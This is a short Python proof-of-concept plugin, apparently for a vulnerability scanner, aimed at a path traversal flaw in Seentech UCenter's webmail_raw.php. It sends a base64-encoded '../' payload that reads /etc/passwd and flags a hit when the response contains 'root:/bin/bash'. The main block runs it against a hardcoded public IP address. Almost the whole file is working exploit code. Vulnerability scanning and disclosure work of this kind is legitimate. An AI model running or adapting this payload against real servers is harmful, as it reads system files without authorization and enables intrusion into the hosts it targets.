#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer:http://www.wooyun.org/bugs/wooyun-2010-0126977

def assign(service, arg):
    if service == 'seentech_uccenter':
        return True, arg
        
def audit(arg):
    payload = "ucenter/tjbb/webmail_raw.php?path=Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA=="
    code,_,res,_,_ = curl.curl2(arg+payload)
    if code==200 and 'root:/bin/bash' in res :
        security_warning(arg+payload)
if __name__ == '__main__':
    from dummy import *
    audit(assign('seentech_uccenter', 'https://60.223.226.154/')[1])